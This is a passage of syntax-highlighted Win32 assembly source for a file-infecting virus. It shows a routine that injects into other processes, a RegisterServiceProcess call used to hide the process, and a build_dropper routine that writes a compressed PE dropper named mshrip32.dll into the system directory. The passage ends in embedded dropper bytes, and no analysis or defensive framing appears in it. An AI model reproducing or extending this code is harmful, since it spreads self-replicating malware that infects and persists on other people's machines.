    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy one to mem</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m_sign</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;thread memory sign</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;active flag</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc5">count</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_addrs</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">1F0FFFh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lpRegisterServiceProcess</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cpm_winnt</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">cpm_winnt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpOpenProcess</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;create inside thread from</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;the dropper</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">cpm_failed</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpWaitForSingleObject</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">cpm_failed</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc5">p_number</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cpm_nxproc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">               </span><span class="sc1">;remove the virus from the</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">mem_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">newCreateFile</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;current file, live on the</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateFile</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;other places inside win32</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">error</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
   </span><span class="sc5">cpm_failed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">cpm_fnodeal</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
   </span><span class="sc5">cpm_fnodeal</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cpm_cmdline</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">mdealloc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;deallocate shared memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpUnMapViewOfFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   </span><span class="sc10">error</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">create_process_maps</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">build_dropper</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">             </span><span class="sc1">;generate dropper filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cpm_cmdline</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;no more then 0x80 chars</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGetSystemDirectory</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get system directory</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bd_failed</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bd_fname</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\mshrip32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;hmmm, my dropper name</span><span class="sc0">
     </span><span class="sc5">bd_fname</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_always_file</span><span class="sc0">        </span><span class="sc1">;create its</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bd_failed</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">            </span><span class="sc1">;alloc memory for dropper</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;edi=output, all is zero</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">60000</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dropper_data</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cpm_shared_mem</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGetVersion</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">63</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">m_sign</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">224</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;noone knows what is it</span><span class="sc0">
      </span><span class="sc5">bd_read</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;create EXE PE dropper</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;end of data?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bd_done</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;next movement</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc5">bd_write</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;save data</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">bd_write</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bd_read</span><span class="sc0">
    </span><span class="sc5">E8</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0E8</span><span class="sc0">
      </span><span class="sc5">bd_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;droppers body</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;file handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpWriteFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpCloseHandle</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;write error ?</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">bd_failed</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">
      </span><span class="sc5">bd_failed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc10">radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">            </span><span class="sc1">;compressed [dropper EXE(PE) 1024 bytes]</span><span class="sc0">
   </span><span class="sc5">dropper_data</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">5A</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">4C</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">7F</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">38</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0E6</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">88</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">54</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0C8</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0E</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0A</span><span class="sc4">,</span><span class="sc2">7E</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">96</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">89</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc4">,</span><span class="sc2">1E</span><span class="sc4">,</span><span class="sc2">66</span><span class="sc4">,</span><span class="sc2">0C7</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
